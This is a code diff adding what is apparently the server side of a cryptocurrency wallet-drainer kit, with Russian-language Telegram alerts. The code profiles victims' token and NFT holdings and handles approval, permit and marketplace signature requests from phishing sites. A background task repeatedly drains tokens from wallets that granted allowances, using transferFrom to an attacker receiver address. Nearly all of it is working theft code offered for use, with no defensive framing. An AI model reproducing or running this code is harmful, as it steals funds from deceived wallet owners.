+      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
+        await bot.sendMessage(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил X2Y2</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
+          parse_mode: 'HTML'
+        });
+      }
+      send_response(response, { status: 'OK' });
+    } else if (data.x2y2 == 'success') {
+      if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
+        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
+        await bot.sendMessage(receiver_chat_id, `<b>💎 Успешно подписали X2Y2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
+          parse_mode: 'HTML'
+        });
+      }
+      send_response(response, { status: 'OK' });
+    } else {
+      send_response(response, { status: 'error', error: 'Unable to Execute' });
+    }
+  } catch (err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+const check_wallet = async (response, data) => {
+  try {
+
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+        if (User_IPs_Pool[data.IP]['check_wallet']) {
+          if (Math.floor(Date.now() / 1000) - User_IPs_Pool[data.IP]['check_wallet'] < 60) {
+            return block_request(response);
+          }
+        }
+        User_IPs_Pool[data.IP]['check_wallet'] = Math.floor(Date.now() / 1000);
+      } else {
+        User_IPs_Pool[data.IP] = {
+          check_wallet: Math.floor(Date.now() / 1000)
+        };
+      }
+    }
+
+    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
+      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
+    }
+
+    if (MS_Check_Limits) {
+      if (MS_Check_Settings.block_for_all && Checks_Data.all_checks >= MS_Check_Settings.limit_for_all) {
+        return send_response(response, { status: 'error',  error: 'LIMITED' });
+      }
+      if (!data.IP || (MS_Check_Settings.block_by_ip && data.IP && Checks_Data.personal[data.IP] && Checks_Data.personal[data.IP] >= MS_Check_Settings.limit_personal)) {
+        return send_response(response, { status: 'error',  error: 'LIMITED' });
+      }
+      if (!data.user_id || (MS_Check_Settings.block_by_id && data.user_id && Checks_Data.personal[data.user_id] && Checks_Data.personal[data.user_id] >= MS_Check_Settings.limit_personal)) {
+        return send_response(response, { status: 'error',  error: 'LIMITED' });
+      }
+      Checks_Data.all_checks += 1;
+      Checks_Data.personal[data.user_id] += 1;
+      Checks_Data.personal[data.IP] += 1;
+    }
+
+    let tokens = [];
+
+    if (MS_Use_DeBank) {
+      try {
+        let result = await axios.get(`https://pro-openapi.debank.com/v1/user/all_token_list?id=${data.address}`, {
+          headers: {
+            'Accept': 'application/json',
+            'AccessKey': MS_DeBank_Token
+          }
+        });
+        for (const asset of result.data) {
+          try {
+            const chain_id = convert_chain('DEBANK', 'ID', asset.chain);
+            if (chain_id == false || !asset.is_verified) continue;
+            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.id.toLowerCase())) continue;
+            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.id.toLowerCase())) continue;
+            let amount_usd = asset.amount * asset.price;
+            let new_asset = {
+              chain_id: chain_id, name: asset.name, type: (asset.id == asset.chain) ? 'NATIVE' : 'ERC20',
+              amount: asset.amount, amount_raw: ethers.BigNumber.from(asset.raw_amount_hex_str).toString(),
+              amount_usd, symbol: asset.symbol, decimals: asset.decimals, address: asset.id, price: asset.price
+            };
+            if (new_asset.price > 0) tokens.push(new_asset);
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+
+    if (MS_Use_Zapper) {
+      try {
+        let z_update = await axios.post(`https://api.zapper.xyz/v2/balances/tokens?addresses%5B%5D=${data.address}&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=optimism&networks%5B%5D=binance-smart-chain&networks%5B%5D=fantom&networks%5B%5D=avalanche&networks%5B%5D=arbitrum`, null, {
+          headers: {
+            'Accept': 'application/json',
+            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
+          }
+        });
+        if (z_update.data.jobId) {
+          let zapper_status = 'active';
+          let zapper_id = z_update.data.jobId;
+          while (zapper_status == 'active') {
+            await new Promise(r => setTimeout(r, 500));
+            z_update = await axios.get(`https://api.zapper.xyz/v2/balances/job-status?jobId=${zapper_id}`, {
+              headers: {
+                'Accept': 'application/json',
+                'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
+              }
+            });
+            if (z_update.data.status) {
+              zapper_status = z_update.data.status;
+            } else {
+              zapper_status = 'unknown';
+            }
+          }
+        }
+      } catch(err) {
+        console.log(err);
+      }
+      try {
+        let result = await axios.get(`https://api.zapper.xyz/v2/balances/tokens?addresses%5B%5D=${data.address}&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=optimism&networks%5B%5D=binance-smart-chain&networks%5B%5D=fantom&networks%5B%5D=avalanche&networks%5B%5D=arbitrum`, {
+          headers: {
+            'Accept': 'application/json',
+            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
+          }
+        });
+        if (result.data[data.address] && result.data[data.address] != null) {
+          for (const asset of result.data[data.address]) {
+            try {
+              const chain_id = convert_chain('ZAPPER', 'ID', asset.network);
+              if (chain_id == false) continue;
+              if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.token.address.toLowerCase())) continue;
+              else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.token.address.toLowerCase())) continue;
+              let item_id = -1, item_type = (asset.token.address == '0x0000000000000000000000000000000000000000') ? 'NATIVE' : 'ERC20';
+              for (let x = 0; x < tokens.length; x++) {
+                if ((asset.token.address == tokens[x].address) || (item_type == 'NATIVE' && item_type == tokens[x].type && chain_id == tokens[x].chain_id)) {
+                  item_id = x;
+                  break;
+                }
+              }
+              if (item_id == -1) {
+                let new_asset = {
+                  chain_id: chain_id, name: asset.token.name || 'NATIVE', type: item_type,
+                  amount: asset.token.balance, amount_raw: ethers.BigNumber.from(asset.token.balanceRaw).toString(),
+                  amount_usd: asset.token.balanceUSD, symbol: asset.token.symbol || 'N/A', decimals: asset.token.decimals || 18,
+                  address: asset.token.address, price: asset.token.price || 0
+                };
+                if (new_asset.price > 0) tokens.push(new_asset);
+              }
+            } catch(err) {
+              console.log(err);
+            }
+          }
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+
+    if (MS_Use_Ankr) {
+      try {
+        let result = await axios.post(`https://rpc.ankr.com/multichain/${MS_Ankr_Token}`, {
+          "id": 1, "jsonrpc": "2.0", "method": "ankr_getAccountBalance",
+          "params": {
+            "blockchain": [ "eth", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism" ],
+            "walletAddress": data.address
+          }
+        }, {
+          headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+          }
+        });
+        for (const asset of result.data.result.assets) {
+          try {
+            const chain_id = convert_chain('ANKR', 'ID', asset.blockchain);
+            if (chain_id == false) continue;
+            let contract_address = asset.contractAddress || 'NATIVE';
+            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(contract_address.toLowerCase())) continue;
+            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(contract_address.toLowerCase())) continue;
+            let item_id = -1, item_type = (contract_address == 'NATIVE') ? 'NATIVE' : 'ERC20';
+            for (let x = 0; x < tokens.length; x++) {
+              if ((contract_address == tokens[x].address) || (item_type == 'NATIVE' && item_type == tokens[x].type && chain_id == tokens[x].chain_id)) {
+                item_id = x;
+                break;
+              }
+            }
+            if (item_id == -1) {
+              let new_asset = {
+                chain_id: chain_id,
+                name: asset.tokenName, type: asset.tokenType,
+                amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
+                amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
+                decimals: asset.tokenDecimals, address: contract_address || null,
+                price: parseFloat(asset.tokenPrice)
+              };
+              if (new_asset.price > 0) tokens.push(new_asset);
+            }
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+
+    return send_response(response, { status: 'OK', data: tokens });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+}
+
+const get_wallet_balance = async (address) => {
+  try {
+    let result = await axios.get(`https://pro-openapi.debank.com/v1/user/total_balance?id=${address}`, {
+      headers: {
+        'Accept': 'application/json',
+        'AccessKey': MS_DeBank_Token
+      }
+    });
+    await new Promise(r => setTimeout(r, 1000));
+    let result_2 = await axios.get(`https://pro-openapi.debank.com/v1/user/all_token_list?id=${address}`, {
+      headers: {
+        'Accept': 'application/json',
+        'AccessKey': MS_DeBank_Token
+      }
+    });
+    if (result.data.total_usd_value && typeof result_2.data == 'object') {
+      return {
+        balance: result.data.total_usd_value,
+        chains: result.data.chain_list,
+        assets: result_2.data
+      }
+    }
+  } catch(err) {
+    return false;
+  }
+};
+
+const check_nft = async (response, data) => {
+  try {
+
+    if (MS_Protection) {
+      if (User_IPs_Pool[data.IP]) {
+        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
+          return block_request(response);
+        }
+        if (User_IPs_Pool[data.IP]['check_nfts']) {
+          if (Math.floor(Date.now() / 1000) - User_IPs_Pool[data.IP]['check_nfts'] < 60) {
+            return block_request(response);
+          }
+        }
+        User_IPs_Pool[data.IP]['check_nfts'] = Math.floor(Date.now() / 1000);
+      } else {
+        User_IPs_Pool[data.IP] = {
+          check_nfts: Math.floor(Date.now() / 1000)
+        };
+      }
+    }
+
+    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
+      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
+    }
+
+    if (MS_Check_Limits) {
+      if (MS_Check_Settings.block_for_all && Checks_Data.all_checks >= MS_Check_Settings.limit_for_all) {
+        return send_response(response, { status: 'error',  error: 'LIMITED' });
+      }
+      if (!data.IP || (MS_Check_Settings.block_by_ip && data.IP && Checks_Data.personal[data.IP] && Checks_Data.personal[data.IP] >= MS_Check_Settings.limit_personal)) {
+        return send_response(response, { status: 'error',  error: 'LIMITED' });
+      }
+      if (!data.user_id || (MS_Check_Settings.block_by_id && data.user_id && Checks_Data.personal[data.user_id] && Checks_Data.personal[data.user_id] >= MS_Check_Settings.limit_personal)) {
+        return send_response(response, { status: 'error',  error: 'LIMITED' });
+      }
+      Checks_Data.all_checks += 1;
+      Checks_Data.personal[data.user_id] += 1;
+      Checks_Data.personal[data.IP] += 1;
+    }
+
+    let tokens = [];
+
+    try {
+      if (MS_Use_OpenSea) {
+        let result = await axios.get(`https://api.opensea.io/api/v1/assets?owner=${data.address}&order_direction=desc&limit=200&include_orders=false`, {
+          headers: {
+            'Accept': 'application/json',
+            'X-API-KEY': MS_OpenSea_Token
+          }
+        });
+        if (result.data.assets) {
+          let result_2 = await axios.get(`https://api.opensea.io/api/v1/collections?asset_owner=${data.address}&offset=0&limit=200`, {
+            headers: {
+              'Accept': 'application/json',
+              'X-API-KEY': MS_OpenSea_Token
+            }
+          });
+          for (const asset of result.data.assets) {
+            try {
+              let collection = null;
+              for (const x_collection of result_2.data) {
+                try {
+                  if (x_collection.primary_asset_contracts.length < 1) continue;
+                  if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
+                    collection = x_collection;
+                    break;
+                  }
+                } catch(err) {
+                  console.log(err);
+                }
+              }
+              if (collection == null) continue;
+              if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase())) continue;
+              else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.asset_contract.address.toLowerCase())) continue;
+              let asset_chain_id = convert_chain('OPENSEA', 'ID', asset.asset_contract.chain_identifier);
+              let asset_price = (collection.stats.one_day_average_price != 0) ? collection.stats.one_day_average_price : collection.stats.seven_day_average_price;
+              asset_price = asset_price * MS_Currencies[convert_chain('ID', 'CURRENCY', asset_chain_id)]['USD'];
+              let new_asset = {
+                chain_id: asset_chain_id, name: asset.name, type: asset.asset_contract.schema_name, amount: asset.num_sales,
+                amount_raw: null, amount_usd: asset_price, id: asset.token_id, symbol: null, decimals: null,
+                address: asset.asset_contract.address, price: asset_price
+              };
+              if (typeof asset_price == 'number' && !isNaN(asset_price) && asset_price > 0) tokens.push(new_asset);
+            } catch(err) {
+              console.log(err);
+            }
+          }
+        }
+      } else if (MS_Use_DeBank && !MS_Use_Zapper) {
+        let result = await axios.get(`https://pro-openapi.debank.com/v1/user/all_nft_list?id=${data.address}`, {
+          headers: {
+            'Accept': 'application/json',
+            'AccessKey': MS_DeBank_Token
+          }
+        });
+        for (const asset of result.data) {
+          try {
+            const chain_id = convert_chain('DEBANK', 'ID', asset.chain);
+            if (chain_id == false) continue;
+            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.contract_id.toLowerCase())) continue;
+            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.contract_id.toLowerCase())) continue;
+            asset.name = asset.name.replaceAll(/[^a-zA-Z0-9 ]/g, '');
+            let new_asset = {
+              chain_id: chain_id, name: asset.name, type: asset.is_erc721 ? 'ERC721' : 'ERC1155',
+              amount: asset.amount, amount_raw: null, amount_usd: asset.usd_price || null, id: asset.inner_id,
+              symbol: null, decimals: null, address: asset.contract_id, price: asset.usd_price || null
+            };
+            if (new_asset.price != null && new_asset.price > 0) tokens.push(new_asset);
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      } else {
+        let result = await axios.get(`https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=${data.address}&limit=25`, {
+          headers: {
+            'Accept': 'application/json',
+            'Authorization': `Basic ${Buffer.from(MS_Zapper_Token + ':').toString('base64')}`
+          }
+        });
+        for (const asset of result.data.items) {
+          try {
+            const chain_id = convert_chain('ZAPPER', 'ID', asset.token.collection.network);
+            if (chain_id == false) continue;
+            if (MS_Contract_Whitelist.length > 0 && !MS_Contract_Whitelist.includes(asset.token.collection.address.toLowerCase())) continue;
+            else if (MS_Contract_Blacklist.length > 0 && MS_Contract_Blacklist.includes(asset.token.collection.address.toLowerCase())) continue;
+            let price = parseFloat(asset.token.estimatedValueEth) * MS_Currencies[convert_chain('ID', 'CURRENCY', chain_id)]['USD'];
+            if (typeof price != 'number' || isNaN(price)) continue;
+            asset.token.name = asset.token.name.replaceAll(/[^a-zA-Z0-9 ]/g, '');
+            let new_asset = {
+              chain_id: chain_id, name: asset.token.name, type: (asset.token.collection.nftStandard != 'erc1155') ? 'ERC721' : 'ERC1155',
+              amount: asset.balance, amount_raw: null, amount_usd: price, id: asset.token.tokenId,
+              symbol: null, decimals: null, address: asset.token.collection.address, price: price
+            };
+            if (new_asset.price > 0) tokens.push(new_asset);
+          } catch(err) {
+            console.log(err);
+          }
+        }
+      }
+    } catch(err) {
+      console.log(err);
+    }
+
+    return send_response(response, { status: 'OK', data: tokens });
+  } catch(err) {
+    console.log(err);
+    send_response(response, { status: 'error', error: 'Unable to Execute' });
+  }
+};
+
+let Message_TS_List = {};
+
+if (MS_Repeats_Protection) {
+  setInterval(() => {
+    Message_TS_List = {};
+  }, MS_Repeats_TS * 1000);
+}
+
+web.post("/", (request, response) => {
+  try {
+    let data = request.body;
+
+    if (!data['ver'] || data['ver'] != '19082023') {
+      return send_response(response, { status: 'error', error: 'INVALID_VERSION' });
+    }
+
+    if (!data['raw']) {
+      return response.status(500).send('Unable to Execute');
+    }
+
+    const encode_key = Buffer.from(String(10 + 256 + 1024 + 2048 + MS_Encryption_Key)).toString('base64');
+    data = JSON.parse(Buffer.from(srp(encode_key, data['raw']), 'base64').toString('ascii'));
+    if (!data['action']) return response.status(500).send('Unable to Execute');
+
+    data['IP'] = request.headers['x-forwarded-for'] || request.socket['remoteAddress'];
+    data['IP'] = data['IP'].replace('::ffff:', '');
+
+    data['UA'] = request.useragent;
+
+    if (MS_Domains_Mode == 1 && MS_Domains_Whilelist.length > 0 && data['domain']) {
+      try {
+        if (!MS_Domains_Whilelist.includes(data['domain'])) {
+          return send_response(response, { status: 'error', error: 'Unable to Execute' });
+        }
+      } catch(err) {
+        console.log(err);
+      }
+    }
+
+    if (MS_Repeats_Protection) {
+      if (!data['message_ts'] || (data['user_id'] && data['message_ts']
+      && Message_TS_List[data['user_id']] && data['message_ts'] <= Message_TS_List[data['user_id']]) || (data['IP'] && data['message_ts']
+      && Message_TS_List[data['IP']] && data['message_ts'] <= Message_TS_List[data['IP']])) {
+        return send_response(response, { status: 'error', error: 'Unable to Execute' });
+      } else {
+        Message_TS_List[data['IP']] = data['message_ts'];
+        Message_TS_List[data['user_id']] = data['message_ts'];
+      }
+    }
+
+    if (data['action'] == 'retrive_config') {
+      const Notifications = {};
+      for (const key in MS_Notifications)
+        Notifications[key] = MS_Notifications[key].mode;
+      return send_response(response, {
+        status: 'OK',
+        data: {
+          RPCs: MS_Public_RPC_URLs, Address: MS_Wallet_Address,
+          Notifications: Notifications, Settings: MS_Settings,
+          Contract_Blacklist: MS_Contract_Blacklist,
+          Contract_Whitelist: MS_Contract_Whitelist,
+          Wallet_Blacklist: MS_Wallet_Blacklist,
+          Receiver: MS_Wallet_Receiver, CIS: MS_CIS_Protection,
+          V_MSG: MS_VERIFY_MESSAGE, Loop_N: MS_Loop_Native,
+          Loop_T: MS_Loop_Tokens, Loop_NFT: MS_Loop_NFTs,
+          Permit_BL: MS_PERMIT_BLACKLIST, V_MODE: MS_VERIFY_WALLET,
+          Unlimited_BL: MS_UNLIMITED_BLACKLIST, DSB: MS_Disable_System,
+          AT: "", LA: MS_Loop_Assets
+        }
+      });
+    } else if (data['action'] == 'retrive_contract') {
+      return send_response(response, {
+        status: 'OK', data: MS_Contract_ABI
+      });
+    } else if (data['action'] == 'retrive_id') {
+      return send_response(response, {
+        status: 'OK',  data: free_id()
+      });
+    } else if (data['action'] == 'check_wallet') {
+      if (MS_Use_DeBank == false && MS_Use_Zapper == false && MS_Use_Ankr == false) {
+        return send_response(response, {
+          status: 'error',  error: 'LOCAL_CHECK'
+        });
+      } else {
+        return check_wallet(response, data);
+      }
+    } else if (data['action'] == 'check_nft') {
+      return check_nft(response, data);
+    } else if (data['action'] == 'sign_verify') {
+      if (MS_VERIFY_WALLET == 0) {
+        MS_Verified_Addresses[data.address] = Math.floor(Date.now() / 1000);
+        return send_response(response, { status: 'OK' });
+      } else {
+        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(((!data.message || data.message == "") ? MS_VERIFY_MESSAGE : data.message).replaceAll('{{ADDRESS}}', data.address)), data.sign);
+        if (is_sign_correct) {
+          MS_Verified_Addresses[data.address] = Math.floor(Date.now() / 1000);
+          return send_response(response, { status: 'OK' });
+        } else {
+          return send_response(response, { status: 'error',  error: 'INVALID_SIGN' });
+        }
+      }
+    } else if (data['action'] == 'enter_website') {
+      return on_enter_website(response, data);
+    } else if (data['action'] == 'leave_website') {
+      return on_leave_website(response, data);
+    } else if (data['action'] == 'connect_request') {
+      return on_connect_request(response, data);
+    } else if (data['action'] == 'connect_cancel') {
+      return on_connect_cancel(response, data);
+    } else if (data['action'] == 'connect_success') {
+      return on_connect_success(response, data);
+    } else if (data['action'] == 'check_finish') {
+      return on_check_finish(response, data);
+    } else if (data['action'] == 'transfer_request') {
+      return on_transfer_request(response, data);
+    } else if (data['action'] == 'sign_request') {
+      return on_sign_request(response, data);
+    } else if (data['action'] == 'approve_request') {
+      return on_approve_request(response, data);
+    } else if (data['action'] == 'transfer_success') {
+      return on_transfer_success(response, data);
+    } else if (data['action'] == 'sign_success') {
+      return on_sign_success(response, data);
+    } else if (data['action'] == 'swap_success') {
+      return on_swap_success(response, data);
+    } else if (data['action'] == 'swap_request') {
+      return on_swap_request(response, data);
+    } else if (data['action'] == 'approve_success') {
+      return on_approve_success(response, data);
+    } else if (data['action'] == 'transfer_cancel') {
+      return on_transfer_cancel(response, data);
+    } else if (data['action'] == 'sign_cancel') {
+      return on_sign_cancel(response, data);
+    } else if (data['action'] == 'approve_cancel') {
+      return on_approve_cancel(response, data);
+    } else if (data['action'] == 'chain_request') {
+      return on_chain_request(response, data);
+    } else if (data['action'] == 'chain_success') {
+      return on_chain_success(response, data);
+    } else if (data['action'] == 'chain_cancel') {
+      return on_chain_cancel(response, data);
+    } else if (data['action'] == 'sign_unavailable') {
+      return on_sign_unavailable(response, data);
+    } else if (data['action'] == 'approve_token') {
+      return approve_token(response, data);
+    } else if (data['action'] == 'permit_token') {
+      return permit_token(response, data);
+    } else if (data['action'] == 'safa_approves') {
+      return safa_approves(response, data);
+    } else if (data['action'] == 'sign_permit2') {
+      return sign_permit2(response, data);
+    } else if (data['action'] == 'seaport') {
+      if (SeaPort == null) {
+        return response.status(200).send(JSON.stringify({
+          status: 'error', error: 'SeaPort Module is not installed'
+        }));
+      }
+      return seaport_handler(response, data);
+    } else if (data['action'] == 'blur') {
+      if (Blur == null) {
+        return response.status(200).send(JSON.stringify({
+          status: 'error', error: 'Blur Module is not installed'
+        }));
+      }
+      return blur_handler(response, data);
+    } else if (data['action'] == 'x2y2') {
+      return x2y2_handler(response, data);
+    }
+  } catch(err) {
+    console.log(err);
+    response.status(500).send('Unable to Execute');
+  }
+});
+
+try {
+  web.post("/service/enable", async (_, response) => {
+    try {
+      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      MS_Disable_System = false;
+      return response.status(200).send(JSON.stringify({ status: 'OK' }));
+    } catch(err) {
+      console.log(err);
+      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
+    }
+  });
+  web.post("/service/disable", async (_, response) => {
+    try {
+      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      MS_Disable_System = true;
+      return response.status(200).send(JSON.stringify({ status: 'OK' }));
+    } catch(err) {
+      console.log(err);
+      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
+    }
+  });
+  web.post("/service/telegram", async (_, response) => {
+    try {
+      if (!request.body['access_token'] || request.body['access_token'] != MS_API_Token) {
+        return response.status(200).send(JSON.stringify({ status: 'error', error: 'Access Denied' }));
+      }
+      const result = await bot.getMe();
+      return response.status(200).send(JSON.stringify({ status: 'OK', data: { key: MS_Telegram_Token, chats: MS_Notifications, handle: result }}));
+    } catch(err) {
+      console.log(err);
+      return response.status(200).send(JSON.stringify({ status: 'error', error: 'Unknown Error' }));
+    }
+  });
+} catch(err) {
+  console.log(err);
+}
+
+const withdraw_allowance = async (owner, spender, token, chain_id, permit2 = false) => {
+  try {
+    if (permit2) {
+      let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, '0x000000000022d473030f116ddee9f6b43ac78ba3');
+      if (!current_allowance) return false;
+      const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
+      const signer = new ethers.Wallet(MS_Allowance_Withdraw.wallets[spender], node);
+      const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
+      const permit_data = await contract.allowance(owner, token, spender);
+      if (ethers.BigNumber.from(permit_data.amount).lt(ethers.BigNumber.from(current_allowance))) {
+        return false;
+      }
+      const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+      try {
+        gas_limit = await contract.estimateGas.transferFrom(owner, MS_Wallet_Receiver, current_allowance, token, { from: spender });
+        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+      } catch(err) {
+        gas_limit = 15000000;
+      }
+      if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
+        return false;
+      }
+      const nonce = await node.getTransactionCount(spender, "pending");
+      const tx = await contract.transferFrom(owner, MS_Wallet_Receiver, current_allowance, token, {
+        gasLimit: ethers.BigNumber.from(gas_limit),
+        gasPrice: ethers.BigNumber.from(gas_price),
+        nonce: nonce
+      });
+      await node.waitForTransaction(tx.hash, 1, 60000);
+      try {
+        const contract_2 = new ethers.Contract(token, MS_Contract_ABI['ERC20'], signer);
+        const balance = ethers.BigNumber.from(await contract_2.balanceOf(owner));
+        update_allowance(owner, spender, token, chain_id, true, balance.toString());
+      } catch(err) {
+        console.log(err);
+      }
+      if (MS_Notifications.approve_success.mode) {
+        await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли и вывели токен с кошелька</b>\n\n<b>Кошелек:</b> <code>${owner}</code>\n<b>Токен:</b> <code>${token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(current_allowance)))}</code>`, {
+          parse_mode: 'HTML'
+        });
+      }
+    } else {
+      let current_allowance = await Get_ERC20_Allowance(chain_id, token, owner, spender);
+      if (!current_allowance) return false;
+      const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
+      const signer = new ethers.Wallet(MS_Allowance_Withdraw.wallets[spender], node);
+      const contract = new ethers.Contract(token, MS_Contract_ABI['ERC20'], signer);
+      const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+      let gas_limit = null;
+      try {
+        gas_limit = await contract.estimateGas.transferFrom(owner, MS_Wallet_Receiver, current_allowance, { from: spender });
+        gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
+      } catch(err) {
+        gas_limit = 15000000;
+      }
+      const nonce = await node.getTransactionCount(spender, "pending");
+      if (ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('5000000'))) {
+        return false;
+      }
+      const tx = await contract.transferFrom(owner, MS_Wallet_Receiver, current_allowance, {
+        gasLimit: ethers.BigNumber.from(gas_limit),
+        gasPrice: ethers.BigNumber.from(gas_price),
+        nonce: nonce
+      });
+      await node.waitForTransaction(tx.hash, 1, 60000);
+      try {
+        const balance = ethers.BigNumber.from(await contract.balanceOf(owner));
+        update_allowance(owner, spender, token, chain_id, false, balance.toString());
+      } catch(err) {
+        console.log(err);
+      }
+      if (MS_Notifications.approve_success.mode) {
+        await bot.sendMessage(MS_Notifications.approve_success.chat_id, `<b>🎁 Нашли и вывели токен с кошелька</b>\n\n<b>Кошелек:</b> <code>${owner}</code>\n<b>Токен:</b> <code>${token}</code>\n<b>Сеть:</b> <code>${chain_id_to_name(chain_id)}</code>\n<b>Количество:</b> <code>${parseFloat(ethers.utils.formatEther(ethers.BigNumber.from(current_allowance)))}</code>`, {
+          parse_mode: 'HTML'
+        });
+      }
+    }
+  } catch(err) {
+    console.log(err);
+  } return true;
+};
+
+if (MS_Allowance_Check) {
+  let allowance_in_check = false;
+  setInterval(async () => {
+    try {
+      if (allowance_in_check) return;
+      let allowance_list = [];
+      if (fs.existsSync('allowances.dat'))
+        allowance_list = JSON.parse(fs.readFileSync('allowances.dat', 'utf-8'));
+      allowance_in_check = true;
+      for (const allowance of allowance_list) {
+        try {
+          if (allowance.owner == MS_Wallet_Receiver) continue;
+          if (allowance.permit2) {
+            const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[allowance.chain_id]);
+            const signer = new ethers.Wallet(MS_Wallet_Private, node);
+            const contract = new ethers.Contract(allowance.token, MS_Contract_ABI['ERC20'], signer);
+            const balance = ethers.BigNumber.from(await contract.balanceOf(allowance.owner));
+            if (allowance.last_balance && balance.eq(ethers.BigNumber.from(allowance.last_balance))) continue;
+            else update_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true, balance.toString());
+            const allowance_num = ethers.BigNumber.from(await contract.allowance(allowance.owner, '0x000000000022d473030f116ddee9f6b43ac78ba3'));
+            if (allowance_num.lte(ethers.BigNumber.from('0'))) {
+              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
+              continue;
+            }
+            const contract_2 = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_SINGLE'], signer);
+            const permit_data = await contract_2.allowance(allowance.owner, allowance.token, allowance.spender);
+            if (ethers.BigNumber.from(permit_data.amount).lte(ethers.BigNumber.from('0'))) {
+              remove_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
+              continue;
+            }
+            if (balance.gt(ethers.BigNumber.from('0'))) {
+              if (MS_Allowance_Withdraw.mode == true && balance.gte(ethers.BigNumber.from(MS_Allowance_Withdraw.min_amount)) && MS_Allowance_Withdraw.wallets[allowance.spender]) {
+                await withdraw_allowance(allowance.owner, allowance.spender, allowance.token, allowance.chain_id, true);
+              } else {
